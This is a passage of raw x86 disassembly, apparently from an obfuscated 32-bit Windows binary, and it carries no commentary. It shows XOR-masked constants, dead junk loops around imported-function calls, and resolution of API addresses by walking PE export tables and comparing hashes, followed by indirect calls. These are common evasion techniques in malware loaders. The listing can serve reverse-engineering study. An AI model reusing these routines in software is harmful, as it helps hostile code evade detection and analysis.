  423d3b:	mov    DWORD PTR ds:0x42a401,0x1204
  423d45:	jne    0x423f1b
  423d4b:	push   DWORD PTR [ebp+0x8]
  423d4e:	call   0x424b21
  423d53:	and    DWORD PTR ds:0x42a3fd,0x0
  423d5d:	jmp    0x423d6f
  423d62:	mov    esi,DWORD PTR ds:0x42a3fd
  423d68:	inc    esi
  423d69:	mov    DWORD PTR ds:0x42a3fd,esi
  423d6f:	cmp    DWORD PTR ds:0x42a3fd,0x1c
  423d76:	jae    0x423db3
  423d7c:	cmp    DWORD PTR ds:0x42a3fd,0x7
  423d83:	jne    0x423d94
  423d89:	push   0x4aee
  423d8e:	call   DWORD PTR ds:0x425048
  423d94:	cmp    DWORD PTR ds:0x42a3fd,0x6
  423d9b:	jne    0x423dae
  423da1:	mov    esi,DWORD PTR ds:0x42a3fd
  423da7:	inc    esi
  423da8:	mov    DWORD PTR ds:0x42a3fd,esi
  423dae:	jmp    0x423d62
  423db3:	mov    DWORD PTR [ebp-0x20],eax
  423db6:	mov    eax,DWORD PTR [ebp-0x4]
  423db9:	xor    DWORD PTR ds:0x42a2e1,0x1ce4
  423dc3:	mov    ecx,DWORD PTR [ebp-0x20]
  423dc6:	mov    DWORD PTR ds:0x42a339,0x17
  423dd0:	cmp    DWORD PTR ds:0x42a339,0x0
  423dd7:	je     0x423e21
  423ddd:	cmp    DWORD PTR ds:0x42a339,0xb
  423de4:	jne    0x423df5
  423dea:	push   0x1
  423dec:	push   DWORD PTR [ebp-0x1c]
  423def:	call   DWORD PTR ds:0x425204
  423df5:	cmp    DWORD PTR ds:0x42a339,0xc
  423dfc:	jne    0x423e0f
  423e02:	mov    esi,DWORD PTR ds:0x42a339
  423e08:	dec    esi
  423e09:	mov    DWORD PTR ds:0x42a339,esi
  423e0f:	mov    esi,DWORD PTR ds:0x42a339
  423e15:	dec    esi
  423e16:	mov    DWORD PTR ds:0x42a339,esi
  423e1c:	jmp    0x423dd0
  423e21:	mov    esi,0x7510850
  423e26:	xor    eax,esi
  423e28:	add    eax,ebx
  423e2a:	cmp    ecx,eax
  423e2c:	je     0x423f5c
  423e32:	push   DWORD PTR [ebp-0x20]
  423e35:	push   DWORD PTR [ebp+0x8]
  423e38:	add    DWORD PTR ds:0x42a33d,0x74d7
  423e42:	call   0x424510
  423e47:	movzx  ecx,WORD PTR ds:0x42a3f5
  423e4e:	sbb    ecx,DWORD PTR ds:0x42a2e9
  423e54:	mov    DWORD PTR ds:0x42a3f5,ecx
  423e5a:	mov    DWORD PTR [ebp-0x14],eax
  423e5d:	mov    eax,DWORD PTR [ebp-0x4]
  423e60:	and    DWORD PTR ds:0x42a349,0x0
  423e6a:	mov    ecx,DWORD PTR ds:0x42a349
  423e70:	inc    ecx
  423e71:	mov    DWORD PTR ds:0x42a349,ecx
  423e77:	cmp    DWORD PTR ds:0x42a349,0x16
  423e7e:	jne    0x423e8f
  423e84:	push   0x42a663
  423e89:	call   DWORD PTR ds:0x425208
  423e8f:	cmp    DWORD PTR ds:0x42a349,0x12
  423e96:	jb     0x423e6a
  423e9c:	mov    DWORD PTR ds:0x42a3c1,0x1f
  423ea6:	cmp    DWORD PTR ds:0x42a3c1,0x0
  423ead:	je     0x423edd
  423eb3:	cmp    DWORD PTR ds:0x42a3c1,0x26
  423eba:	jne    0x423ec9
  423ec0:	push   DWORD PTR [ebp-0x14]
  423ec3:	call   DWORD PTR ds:0x425380
  423ec9:	xor    ecx,ecx
  423ecb:	add    ecx,DWORD PTR ds:0x42a3c1
  423ed1:	dec    ecx
  423ed2:	mov    DWORD PTR ds:0x42a3c1,ecx
  423ed8:	jmp    0x423ea6
  423edd:	mov    ecx,DWORD PTR [ebp-0x14]
  423ee0:	xor    eax,esi
  423ee2:	add    eax,ebx
  423ee4:	cmp    ecx,eax
  423ee6:	je     0x423f5c
  423eec:	mov    eax,DWORD PTR [ebp-0x14]
  423eef:	mov    eax,DWORD PTR [eax+0x18]
  423ef2:	mov    DWORD PTR [ebp-0x20],eax
  423ef5:	mov    eax,DWORD PTR [ebp-0x14]
  423ef8:	mov    ecx,DWORD PTR [ebp+0x8]
  423efb:	add    ecx,DWORD PTR [eax+0x20]
  423efe:	mov    DWORD PTR [ebp-0x28],ecx
  423f01:	mov    eax,DWORD PTR [ebp-0x14]
  423f04:	mov    ecx,DWORD PTR [ebp+0x8]
  423f07:	add    ecx,DWORD PTR [eax+0x24]
  423f0a:	mov    DWORD PTR [ebp-0x2c],ecx
  423f0d:	mov    eax,DWORD PTR [ebp-0x14]
  423f10:	mov    ecx,DWORD PTR [ebp+0x8]
  423f13:	add    ecx,DWORD PTR [eax+0x1c]
  423f16:	xor    esi,esi
  423f18:	mov    DWORD PTR [ebp-0x14],ecx
  423f1b:	mov    eax,DWORD PTR [ebp-0x28]
  423f1e:	mov    ecx,DWORD PTR [ebp+0x8]
  423f21:	add    ecx,DWORD PTR [eax+edi*4]
  423f24:	lea    eax,[ebp-0x8]
  423f27:	mov    DWORD PTR [ebp-0x30],ecx
  423f2a:	push   eax
  423f2b:	push   DWORD PTR [ebp-0x30]
  423f2e:	push   DWORD PTR [ebp+0xc]
  423f31:	call   0x42481e
  423f36:	mov    eax,DWORD PTR [ebp-0x4]
  423f39:	mov    ecx,DWORD PTR [ebp-0x8]
  423f3c:	xor    eax,0x7510850
  423f41:	add    eax,ebx
  423f43:	cmp    ecx,eax
  423f45:	jne    0x423f68
  423f4b:	mov    eax,DWORD PTR [ebp-0x20]
  423f4e:	inc    edi
  423f4f:	cmp    edi,eax
  423f51:	jb     0x423d2f
  423f57:	jmp    0x423f78
  423f5c:	mov    eax,DWORD PTR [ebp-0x4]
  423f5f:	xor    eax,esi
  423f61:	add    eax,ebx
  423f63:	jmp    0x4240c6
  423f68:	mov    eax,DWORD PTR [ebp-0x2c]
  423f6b:	movzx  eax,WORD PTR [eax+edi*2]
  423f6f:	mov    ecx,DWORD PTR [ebp-0x14]
  423f72:	mov    eax,DWORD PTR [ecx+eax*4]
  423f75:	mov    DWORD PTR [ebp+0xc],eax
  423f78:	mov    eax,DWORD PTR [ebp-0x4]
  423f7b:	mov    ecx,DWORD PTR [ebp-0x8]
  423f7e:	xor    eax,0x7510850
  423f83:	add    eax,ebx
  423f85:	cmp    ecx,eax
  423f87:	jne    0x423f9a
  423f8d:	mov    eax,DWORD PTR [ebp-0x4]
  423f90:	xor    eax,0x7510850
  423f95:	jmp    0x423f61
  423f9a:	mov    eax,DWORD PTR [ebp+0xc]
  423f9d:	add    eax,DWORD PTR [ebp+0x8]
  423fa0:	mov    DWORD PTR [ebp-0x10],eax
  423fa3:	mov    eax,DWORD PTR [ebp-0x1c]
  423fa6:	test   eax,eax
  423fa8:	je     0x424078
  423fae:	mov    DWORD PTR [ebp-0x24],esi
  423fb1:	push   0xb
  423fb3:	pop    ecx
  423fb4:	push   0x5
  423fb6:	dec    ecx
  423fb7:	pop    ebx
  423fb8:	xchg   ebx,ecx
  423fba:	sub    ebx,ecx
  423fbc:	xchg   ebx,ecx
  423fbe:	dec    ecx
  423fbf:	mov    eax,DWORD PTR [ebp-0x1c]
  423fc2:	imul   eax,ecx
  423fc5:	sub    esp,eax
  423fc7:	mov    DWORD PTR [ebp-0x24],esp
  423fca:	mov    eax,DWORD PTR [ebp-0x4]
  423fcd:	mov    ecx,0x7510850
  423fd2:	xor    eax,ecx
  423fd4:	mov    edx,0x327298
  423fd9:	add    eax,edx
  423fdb:	mov    DWORD PTR [ebp+0x8],eax
  423fde:	mov    eax,DWORD PTR [ebp-0x18]
  423fe1:	xor    eax,ecx
  423fe3:	add    eax,edx
  423fe5:	mov    edx,DWORD PTR [ebp+0x14]
  423fe8:	imul   eax,DWORD PTR [edx]
  423feb:	mov    edx,DWORD PTR [ebp-0x4]
  423fee:	xor    edx,ecx
  423ff0:	mov    ecx,DWORD PTR [ebp+0x8]
  423ff3:	lea    ecx,[edx+ecx*1+0x327298]
  423ffa:	cmp    ecx,eax
  423ffc:	je     0x424073
  424002:	mov    edi,DWORD PTR [ebp-0x18]
  424005:	mov    eax,DWORD PTR [ebp+0x8]
  424008:	mov    edx,DWORD PTR [ebp+0x14]
  42400b:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  42400f:	mov    ecx,0x7510850
  424014:	xor    edx,edx
  424016:	xor    edi,ecx
  424018:	mov    esi,0x327298
  42401d:	add    edi,esi
  42401f:	div    edi
  424021:	mov    edx,DWORD PTR [ebp-0x4]
  424024:	xor    edx,ecx
  424026:	lea    eax,[edx+eax*1+0x327298]
  42402d:	mov    edx,DWORD PTR [ebp+0x8]
  424030:	mov    edi,DWORD PTR [ebp-0x24]
  424033:	mov    DWORD PTR [edi+edx*4],eax
  424036:	mov    eax,DWORD PTR [ebp-0x18]
  424039:	mov    edx,DWORD PTR [ebp+0x8]
  42403c:	xor    eax,ecx
  42403e:	lea    eax,[eax+edx*1+0x327298]
  424045:	mov    DWORD PTR [ebp+0x8],eax
  424048:	mov    eax,DWORD PTR [ebp-0x18]
  42404b:	mov    edx,DWORD PTR [ebp+0x14]
  42404e:	xor    eax,ecx
  424050:	add    eax,esi
  424052:	imul   eax,DWORD PTR [edx]
  424055:	mov    edx,DWORD PTR [ebp-0x4]
  424058:	xor    edx,ecx
  42405a:	mov    ecx,DWORD PTR [ebp+0x8]
  42405d:	lea    ecx,[edx+ecx*1+0x327298]
  424064:	cmp    ecx,eax
  424066:	jne    0x424002
  42406c:	mov    ebx,esi
  42406e:	jmp    0x424078
  424073:	mov    ebx,0x327298
  424078:	mov    eax,DWORD PTR [ebp-0x4]
  42407b:	xor    eax,0x7510850
  424080:	add    eax,ebx
  424082:	mov    DWORD PTR [ebp-0xc],eax
  424085:	xor    ebx,ebx
  424087:	lea    eax,[ebp-0x10]
  42408a:	add    ebx,DWORD PTR [eax]
  42408c:	call   ebx
  42408e:	xor    ebx,ebx
  424090:	inc    ebx
  424091:	cmp    DWORD PTR [ebp+0x10],ebx
  424094:	je     0x4240b2
  42409a:	xchg   edx,eax
  42409b:	push   0xa
  42409d:	pop    ecx
  42409e:	push   0x4
  4240a0:	pop    ebx
  4240a1:	inc    ebx
  4240a2:	xchg   ebx,ecx
  4240a4:	sub    ebx,ecx
  4240a6:	xchg   ebx,ecx
  4240a8:	dec    ecx
  4240a9:	mov    eax,DWORD PTR [ebp-0x1c]
  4240ac:	imul   eax,ecx
  4240af:	add    esp,eax
  4240b1:	xchg   edx,eax
  4240b2:	push   eax
  4240b3:	xor    ebx,ebx
  4240b5:	mov    edx,esp
  4240b7:	dec    edx
  4240b8:	inc    ebx
  4240b9:	add    ebx,DWORD PTR [edx+ebx*1]
  4240bc:	dec    ebx
  4240bd:	xor    edx,edx
  4240bf:	add    DWORD PTR [ebp-0xc],ebx
  4240c2:	pop    ebx
  4240c3:	mov    eax,DWORD PTR [ebp-0xc]
  4240c6:	pop    edi
  4240c7:	pop    esi
  4240c8:	pop    ebx
  4240c9:	leave  
  4240ca:	ret    0x10
  4240cd:	push   ebp
  4240ce:	mov    ebp,esp
  4240d0:	push   ecx
  4240d1:	mov    DWORD PTR ds:0x42a371,0x1c54
  4240db:	push   ecx
  4240dc:	mov    eax,0xf89c8539
  4240e1:	not    DWORD PTR ds:0x42a301
  4240e7:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  4240ee:	push   esi
  4240ef:	mov    DWORD PTR ds:0x42a3cd,0x7f3d
  4240f9:	mov    DWORD PTR [ebp-0x8],eax
  4240fc:	mov    ecx,DWORD PTR [ebp+0x8]
  4240ff:	mov    DWORD PTR ds:0x42a389,0x16bb
  424109:	push   edi
  42410a:	mov    edi,0x7510850
  42410f:	movzx  esi,WORD PTR ds:0x42a37d
  424116:	mov    esi,0x327298
  42411b:	cmp    ecx,eax
  42411d:	je     0x424208
  424123:	mov    eax,ds:0x42a375
  424128:	or     eax,DWORD PTR ds:0x42a2d9
  42412e:	mov    ds:0x42a375,eax
  424133:	mov    eax,DWORD PTR [ebp-0x4]
  424136:	add    ecx,DWORD PTR ds:0x42a375
  42413c:	mov    ecx,DWORD PTR [ebp+0xc]
  42413f:	and    DWORD PTR ds:0x42a405,0x42a301
  424149:	xor    eax,edi
  42414b:	adc    DWORD PTR ds:0x42a3fd,0x42a401
  424155:	add    eax,esi
  424157:	cmp    eax,ecx
  424159:	mov    DWORD PTR ds:0x42a335,0x34ec
  424163:	je     0x424208
  424169:	neg    edx
  42416b:	mov    eax,DWORD PTR [ebp-0x4]
  42416e:	xor    edx,0x6a0b
  424174:	xor    eax,edi
  424176:	or     DWORD PTR ds:0x42a38d,ebx
  42417c:	add    eax,esi
  42417e:	mov    DWORD PTR ds:0x42a3b1,0x1e
  424188:	cmp    DWORD PTR ds:0x42a3b1,0x0
  42418f:	je     0x4241de
  424195:	cmp    DWORD PTR ds:0x42a3b1,0x4
  42419c:	jne    0x4241b2
  4241a2:	push   0x7980
  4241a7:	push   0x42a46e
  4241ac:	call   DWORD PTR ds:0x42520c
  4241b2:	cmp    DWORD PTR ds:0x42a3b1,0x5
  4241b9:	jne    0x4241cc
  4241bf:	mov    edx,DWORD PTR ds:0x42a3b1
  4241c5:	dec    edx
  4241c6:	mov    DWORD PTR ds:0x42a3b1,edx
  4241cc:	mov    edx,DWORD PTR ds:0x42a3b1
  4241d2:	dec    edx
  4241d3:	mov    DWORD PTR ds:0x42a3b1,edx
  4241d9:	jmp    0x424188
  4241de:	push   eax
  4241df:	neg    edx
  4241e1:	push   DWORD PTR [ebp-0x8]
  4241e4:	push   DWORD PTR [ebp-0x4]
  4241e7:	mov    edx,DWORD PTR ds:0x426ae2
  4241ed:	call   0x422938
  4241f2:	mov    ecx,DWORD PTR ds:0x426ae2
  4241f8:	mov    ecx,DWORD PTR [ecx+0x1cc]
  4241fe:	mov    DWORD PTR [ecx],eax
  424200:	mov    eax,DWORD PTR [ebp-0x8]
  424203:	jmp    0x424240
  424208:	mov    eax,DWORD PTR [ebp-0x4]
  42420b:	mov    ecx,DWORD PTR [ebp+0x10]
  42420e:	xor    eax,edi
  424210:	add    eax,esi
  424212:	cmp    eax,ecx
  424214:	jne    0x42423d
  42421a:	mov    eax,DWORD PTR [ebp-0x4]
  42421d:	xor    eax,edi
  42421f:	add    eax,esi
  424221:	mov    ds:0x426b66,eax
  424226:	mov    eax,DWORD PTR [ebp-0x4]
  424229:	xor    eax,edi
  42422b:	add    eax,esi
  42422d:	mov    ds:0x426b5e,eax
  424232:	push   DWORD PTR [ebp-0x8]
  424235:	push   DWORD PTR [ebp-0x4]
  424238:	call   0x42424a
  42423d:	mov    eax,DWORD PTR [ebp-0x4]
  424240:	xor    eax,edi
  424242:	pop    edi
  424243:	add    eax,esi
  424245:	pop    esi
  424246:	leave  
  424247:	ret    0xc
  42424a:	push   ebp
  42424b:	mov    ebp,esp
  42424d:	sub    esp,0x60
  424250:	mov    eax,DWORD PTR [ebp+0x8]
  424253:	push   ebx
  424254:	push   esi
  424255:	sbb    DWORD PTR ds:0x42a301,0x43e9
  42425f:	mov    esi,0x7510850
  424264:	xor    eax,esi
  424266:	mov    DWORD PTR ds:0x42a2d9,0x11
  424270:	cmp    DWORD PTR ds:0x42a2d9,0x0
  424277:	je     0x4242cf
  42427d:	cmp    DWORD PTR ds:0x42a2d9,0x3
  424284:	jne    0x42429b
  42428a:	push   DWORD PTR [ebp-0x18]
  42428d:	push   DWORD PTR [ebp-0x14]
  424290:	push   0x6c3c
  424295:	call   DWORD PTR ds:0x425384
  42429b:	cmp    DWORD PTR ds:0x42a2d9,0x4
  4242a2:	jne    0x4242b7
  4242a8:	xor    ebx,ebx
  4242aa:	add    ebx,DWORD PTR ds:0x42a2d9
  4242b0:	dec    ebx
  4242b1:	mov    DWORD PTR ds:0x42a2d9,ebx
  4242b7:	mov    ebx,DWORD PTR ds:0x42a2d9
  4242bd:	dec    ebx
  4242be:	mov    DWORD PTR ds:0x42a2d9,ebx
  4242c4:	jmp    0x424270
  4242c9:	and    DWORD PTR ds:0x42a3bd,edi
  4242cf:	mov    ebx,0x327298
  4242d4:	add    eax,ebx
  4242d6:	push   edi
  4242d7:	and    DWORD PTR ds:0x42a3f5,0x5463
  4242e1:	mov    DWORD PTR [ebp-0x18],eax
  4242e4:	mov    edi,DWORD PTR [ebp+0x8]
  4242e7:	or     DWORD PTR ds:0x42a2e5,0xd50
  4242f1:	xor    edi,esi
  4242f3:	and    DWORD PTR ds:0x42a389,0x7565
  4242fd:	mov    DWORD PTR [ebp-0xc],0xf89c85f8
  424304:	mov    DWORD PTR [ebp-0x10],0xf89c8738
  42430b:	xor    DWORD PTR ds:0x42a3f9,0x160d
  424315:	add    edi,ebx
  424317:	mov    DWORD PTR ds:0x42a37d,0x567e
  424321:	jmp    0x4244f6
  424326:	cmp    edi,0x3f
  424329:	jne    0x42437c
  42432f:	mov    DWORD PTR ds:0x42a40d,edi
  424335:	mov    eax,ds:0x426962
  42433a:	mov    DWORD PTR ds:0x42a335,0x447
  424344:	mov    eax,DWORD PTR [eax]
  424346:	mov    DWORD PTR ds:0x42a371,0x1615
  424350:	mov    DWORD PTR [ebp-0x14],eax
  424353:	not    DWORD PTR ds:0x42a2e5
  424359:	mov    eax,ds:0x426b6a
  42435e:	mov    eax,DWORD PTR [eax]
  424360:	mov    DWORD PTR ds:0x42a401,0xe61
  42436a:	mov    DWORD PTR [ebp-0x18],eax
  42436d:	mov    DWORD PTR ds:0x42a3bd,0x6bdb
  424377:	jmp    0x4244ea
  42437c:	mov    DWORD PTR ds:0x42a3c9,0x2c50
  424386:	cmp    edi,0x33c
  42438c:	jne    0x42445d
  424392:	mov    DWORD PTR ds:0x42a349,0x14
  42439c:	cmp    DWORD PTR ds:0x42a349,0x0
  4243a3:	je     0x4243ef
  4243a9:	cmp    DWORD PTR ds:0x42a349,0xa
  4243b0:	jne    0x4243c4
  4243b6:	push   0x1979
  4243bb:	push   DWORD PTR [ebp-0x20]
  4243be:	call   DWORD PTR ds:0x42504c
  4243c4:	cmp    DWORD PTR ds:0x42a349,0xb
  4243cb:	jne    0x4243dc
  4243d1:	mov    eax,ds:0x42a349
  4243d6:	dec    eax
  4243d7:	mov    ds:0x42a349,eax
  4243dc:	xor    eax,eax
  4243de:	add    eax,DWORD PTR ds:0x42a349
  4243e4:	dec    eax
  4243e5:	mov    ds:0x42a349,eax
  4243ea:	jmp    0x42439c
  4243ef:	and    DWORD PTR [ebp+0x8],0x0
  4243f3:	mov    eax,DWORD PTR [ebp-0x8]
  4243f6:	sub    eax,DWORD PTR [ebp+0x8]
  4243f9:	or     DWORD PTR ds:0x42a339,0x4a4d
  424403:	push   eax
  424404:	xor    eax,eax
  424406:	or     eax,DWORD PTR ds:0x42a409
  42440c:	add    eax,DWORD PTR ds:0x42a37d
  424412:	mov    ds:0x42a409,eax
  424417:	mov    eax,DWORD PTR [ebp-0x4]
  42441a:	mov    DWORD PTR ds:0x42a2d9,0x3ec0
  424424:	add    eax,DWORD PTR [ebp+0x8]
  424427:	and    DWORD PTR ds:0x42a405,0x5545
  424431:	push   eax
  424432:	or     DWORD PTR ds:0x42a3b9,0x8f4
  42443c:	call   0x414e58
  424441:	inc    DWORD PTR [ebp+0x8]
  424444:	mov    DWORD PTR ds:0x42a2f5,0x53ef
  42444e:	cmp    DWORD PTR [ebp+0x8],0x52
  424452:	jb     0x4243f3
  424458:	jmp    0x4244ea
  42445d:	cmp    edi,0x1a2
  424463:	jne    0x4244b8
  424469:	mov    DWORD PTR [ebp-0x60],0xf89c853c
  424470:	mov    eax,DWORD PTR [ebp-0x4]
  424473:	mov    DWORD PTR [ebp-0x5c],eax
  424476:	mov    eax,DWORD PTR [ebp-0x8]
  424479:	mov    DWORD PTR [ebp-0x58],eax
  42447c:	mov    eax,DWORD PTR [ebp-0xc]
  42447f:	xor    eax,esi
  424481:	add    eax,ebx
  424483:	mov    DWORD PTR [ebp-0x54],eax
  424486:	lea    eax,[ebp-0x1c]
  424489:	mov    DWORD PTR [ebp-0x50],eax
  42448c:	mov    eax,DWORD PTR [ebp-0x60]
  42448f:	xor    eax,esi
  424491:	add    eax,ebx
  424493:	mov    DWORD PTR [ebp-0x60],eax
  424496:	lea    eax,[ebp-0x60]
  424499:	push   eax
  42449a:	mov    eax,DWORD PTR [ebp+0xc]
  42449d:	xor    eax,esi
  42449f:	add    eax,ebx
  4244a1:	push   eax
  4244a2:	mov    eax,ds:0x426b02
  4244a7:	push   0x426a58
  4244ac:	push   DWORD PTR [eax]
  4244ae:	call   0x423a35
  4244b3:	jmp    0x4244ea
  4244b8:	cmp    edi,0x13c
  4244be:	jne    0x4244ea
  4244c4:	mov    eax,DWORD PTR [ebp-0x10]
  4244c7:	xor    eax,esi
  4244c9:	add    eax,ebx
  4244cb:	mov    DWORD PTR [ebp+0x8],eax
  4244ce:	mov    eax,ds:0x426ae2
  4244d3:	mov    DWORD PTR [ebp+0x8],eax
  4244d6:	mov    eax,DWORD PTR [ebp-0x14]
  4244d9:	mov    DWORD PTR [ebp-0x4],eax
  4244dc:	mov    eax,DWORD PTR [ebp-0x4]
  4244df:	push   0x4
  4244e1:	pop    ecx
  4244e2:	sub    ecx,eax
  4244e4:	add    ecx,DWORD PTR [ebp-0x18]
  4244e7:	mov    DWORD PTR [ebp-0x8],ecx
  4244ea:	mov    eax,DWORD PTR [ebp+0xc]
  4244ed:	xor    eax,esi
  4244ef:	lea    edi,[edi+eax*1+0x327298]
  4244f6:	cmp    edi,0x50a
  4244fc:	jne    0x424326
  424502:	mov    eax,DWORD PTR [ebp+0xc]
  424505:	pop    edi
  424506:	xor    eax,esi
  424508:	pop    esi
  424509:	add    eax,ebx
  42450b:	pop    ebx
  42450c:	leave  
  42450d:	ret    0x8
  424510:	push   ebp
  424511:	mov    ebp,esp
  424513:	push   ecx
  424514:	xor    edx,edx
  424516:	push   ecx
  424517:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  42451e:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  424525:	and    DWORD PTR ds:0x42a405,0x0
  42452f:	mov    edx,DWORD PTR ds:0x42a405
  424535:	inc    edx
  424536:	mov    DWORD PTR ds:0x42a405,edx
  42453c:	cmp    DWORD PTR ds:0x42a405,0xa
  424543:	jne    0x424557
  424549:	push   DWORD PTR [ebp-0xc]
  42454c:	push   0x42a47b
  424551:	call   DWORD PTR ds:0x425210
  424557:	cmp    DWORD PTR ds:0x42a405,0x9
  42455e:	jne    0x424573
  424564:	xor    edx,edx
  424566:	or     edx,DWORD PTR ds:0x42a405
  42456c:	inc    edx
  42456d:	mov    DWORD PTR ds:0x42a405,edx
  424573:	cmp    DWORD PTR ds:0x42a405,0x17
  42457a:	jb     0x42452f
  424580:	mov    eax,DWORD PTR [ebp-0x4]
  424583:	mov    ecx,DWORD PTR ds:0x42a3e1
  424589:	mov    ecx,DWORD PTR [ecx]
  42458b:	add    DWORD PTR ds:0x42a3f5,ecx
  424591:	push   esi
  424592:	adc    edx,DWORD PTR ds:0x42a2f1
  424598:	mov    esi,DWORD PTR [ebp-0x8]
  42459b:	sbb    ecx,DWORD PTR ds:0x42a40d
  4245a1:	mov    edx,0x7510850
  4245a6:	xor    eax,edx
  4245a8:	xor    esi,edx
  4245aa:	mov    ecx,DWORD PTR ds:0x42a301
  4245b0:	adc    DWORD PTR ds:0x42a3bd,ecx
  4245b6:	mov    ecx,0x327298
  4245bb:	add    esi,ecx
  4245bd:	add    eax,ecx
  4245bf:	or     DWORD PTR ds:0x42a339,0x45b4
  4245c9:	imul   eax,esi
  4245cc:	mov    DWORD PTR ds:0x42a3cd,edi
  4245d2:	mov    esi,DWORD PTR [ebp+0xc]
  4245d5:	cmp    esi,eax
  4245d7:	mov    DWORD PTR ds:0x42a38d,0x576a
  4245e1:	jne    0x424605
  4245e7:	not    esi
  4245e9:	mov    eax,DWORD PTR [ebp-0x4]
  4245ec:	xor    esi,0x20ed
  4245f2:	mov    esi,DWORD PTR [ebp-0x8]
  4245f5:	xor    eax,edx
  4245f7:	xor    esi,edx
  4245f9:	add    eax,ecx
  4245fb:	add    esi,ecx
  4245fd:	imul   eax,esi
  424600:	jmp    0x424640
  424605:	mov    eax,DWORD PTR [ebp+0xc]
  424608:	mov    eax,DWORD PTR [eax+0x78]
  42460b:	mov    DWORD PTR [ebp+0xc],eax
  42460e:	mov    eax,DWORD PTR [ebp-0x4]
  424611:	mov    esi,DWORD PTR [ebp-0x8]
  424614:	xor    eax,edx
  424616:	xor    esi,edx
  424618:	add    eax,ecx
  42461a:	add    esi,ecx
  42461c:	imul   eax,esi
  42461f:	mov    esi,DWORD PTR [ebp+0xc]
  424622:	cmp    esi,eax
  424624:	mov    eax,DWORD PTR [ebp-0x4]
  424627:	je     0x4245ec
  42462d:	xor    eax,edx
  42462f:	add    eax,ecx
  424631:	mov    ecx,DWORD PTR [ebp+0xc]
  424634:	imul   eax,ecx
  424637:	add    eax,DWORD PTR [ebp+0x8]
  42463a:	mov    DWORD PTR [ebp+0xc],eax
  42463d:	mov    eax,DWORD PTR [ebp+0xc]
  424640:	pop    esi
  424641:	leave  
  424642:	ret    0x8
  424645:	push   ebp
  424646:	mov    ebp,esp
  424648:	mov    eax,ds:0x426b66
  42464d:	movzx  edx,BYTE PTR ds:0x42a3f1
  424654:	or     edx,DWORD PTR ds:0x42a2e5
  42465a:	mov    DWORD PTR ds:0x42a3f1,edx
  424660:	mov    edx,0x327298
  424665:	and    DWORD PTR ds:0x42a371,0x0
  42466f:	xor    ecx,ecx
  424671:	or     ecx,DWORD PTR ds:0x42a371
  424677:	inc    ecx
  424678:	mov    DWORD PTR ds:0x42a371,ecx
  42467e:	cmp    DWORD PTR ds:0x42a371,0x24
  424685:	jne    0x4246a3
  42468b:	push   0x42a449
  424690:	push   0x42a4e6
  424695:	push   0x17db
  42469a:	push   DWORD PTR [ebp-0x10]
  42469d:	call   DWORD PTR ds:0x425050
  4246a3:	cmp    DWORD PTR ds:0x42a371,0x1f
  4246aa:	jb     0x42466f
  4246b0:	mov    DWORD PTR ds:0x42a379,0x24e1
  4246ba:	sub    eax,edx
  4246bc:	and    DWORD PTR ds:0x42a385,0x0
  4246c6:	xor    ecx,ecx
  4246c8:	add    ecx,DWORD PTR ds:0x42a385
  4246ce:	inc    ecx
  4246cf:	mov    DWORD PTR ds:0x42a385,ecx
  4246d5:	cmp    DWORD PTR ds:0x42a385,0x4
  4246dc:	jne    0x4246fb
  4246e2:	push   0x0
  4246e4:	push   DWORD PTR [ebp-0x20]
  4246e7:	push   DWORD PTR [ebp-0x28]
  4246ea:	push   DWORD PTR [ebp-0xc]
  4246ed:	push   DWORD PTR [ebp-0x18]
  4246f0:	push   0x2308
  4246f5:	call   DWORD PTR ds:0x425054
  4246fb:	cmp    DWORD PTR ds:0x42a385,0x3
  424702:	jne    0x424715
  424708:	mov    ecx,DWORD PTR ds:0x42a385
  42470e:	inc    ecx
  42470f:	mov    DWORD PTR ds:0x42a385,ecx
  424715:	cmp    DWORD PTR ds:0x42a385,0x17
  42471c:	jb     0x4246c6
  424722:	and    DWORD PTR ds:0x42a349,0x0
  42472c:	jmp    0x42473e
  424731:	mov    ecx,DWORD PTR ds:0x42a349
  424737:	inc    ecx
  424738:	mov    DWORD PTR ds:0x42a349,ecx
  42473e:	cmp    DWORD PTR ds:0x42a349,0x14
  424745:	jae    0x42478e
  42474b:	cmp    DWORD PTR ds:0x42a349,0x5
  424752:	jne    0x42476e
  424758:	push   0x42a2fd
  42475d:	push   0x30ee
  424762:	push   DWORD PTR [ebp-0x24]
  424765:	push   DWORD PTR [ebp-0x20]
  424768:	call   DWORD PTR ds:0x425388
  42476e:	cmp    DWORD PTR ds:0x42a349,0x4
  424775:	jne    0x424789
  42477b:	push   DWORD PTR ds:0x42a349
  424781:	pop    ecx
  424782:	inc    ecx
  424783:	mov    DWORD PTR ds:0x42a349,ecx
  424789:	jmp    0x424731
  42478e:	mov    ecx,0x7510850
  424793:	push   esi
  424794:	mov    esi,DWORD PTR [ebp+0xc]
  424797:	xor    eax,ecx
  424799:	cmp    eax,esi
  42479b:	je     0x4247e2
  4247a1:	mov    eax,ds:0x426b5e
  4247a6:	mov    esi,DWORD PTR [ebp+0xc]
  4247a9:	sub    eax,edx
  4247ab:	xor    eax,ecx
  4247ad:	cmp    eax,esi
  4247af:	jne    0x4247c5
  4247b5:	mov    eax,ds:0x426b66
  4247ba:	add    eax,DWORD PTR ds:0x426b5e
  4247c0:	jmp    0x4247cc
  4247c5:	mov    eax,DWORD PTR [ebp+0xc]
  4247c8:	xor    eax,ecx
  4247ca:	add    eax,edx
  4247cc:	mov    ds:0x426b5e,eax
  4247d1:	mov    eax,DWORD PTR [ebp+0xc]
  4247d4:	xor    eax,ecx
  4247d6:	add    eax,edx
  4247d8:	mov    ds:0x426b66,eax
  4247dd:	jmp    0x4247ec
  4247e2:	mov    eax,ds:0x426b66
  4247e7:	mov    ds:0x426b5e,eax
  4247ec:	mov    eax,DWORD PTR [ebp+0x8]
  4247ef:	mov    eax,DWORD PTR [eax]
  4247f1:	mov    ecx,DWORD PTR ds:0x426b5e
  4247f7:	add    DWORD PTR [eax],ecx
  4247f9:	pop    esi
  4247fa:	pop    ebp
  4247fb:	ret    0x8
  4247fe:	push   ebp
  4247ff:	mov    ebp,esp
  424801:	mov    eax,DWORD PTR [ebp+0xc]
  424804:	xor    edx,edx
  424806:	mov    ecx,0x7264fd50
  42480b:	div    ecx
  42480d:	mov    ecx,DWORD PTR [ebp+0x10]
  424810:	and    ecx,eax
  424812:	or     ecx,0x81161d8e
  424818:	mov    eax,ecx
  42481a:	pop    ebp
  42481b:	ret    0x18
  42481e:	push   ebp
  42481f:	mov    ebp,esp
  424821:	sub    esp,0x58
